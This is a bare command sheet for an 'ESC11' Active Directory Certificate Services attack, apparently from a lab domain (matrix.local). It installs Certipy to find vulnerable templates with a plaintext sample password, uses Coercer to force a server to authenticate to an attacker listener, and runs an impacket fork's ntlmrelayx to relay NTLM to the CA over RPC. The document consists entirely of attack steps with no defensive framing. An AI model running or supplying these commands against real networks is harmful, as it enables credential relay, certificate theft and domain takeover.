# ESC11
python3 -m venv venv
source venv/bin/activate
pip3 install certipy-ad

https://<IP_ADDRESS>/certsrv

certipy find -vulnerable -u trinity@matrix.local -p 'Password123!' -dc-ip 172.16.5.10

git clone https://github.com/p0dalirius/Coercer.git
cd Coercer
pip install -r requirements.txt


python3 Coercer.py coerce -t 172.16.5.50 -u trinity -p 'Password123!' -d matrix.local -l 172.16.5.101




git clone https://github.com/sploutchy/impacket.git
cd impacket
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt


python3 examples/ntlmrelayx.py -t rpc://172.16.5.10 -rpc-mode ICPR -icpr-ca-name matrix-DC01-CA -smb2support
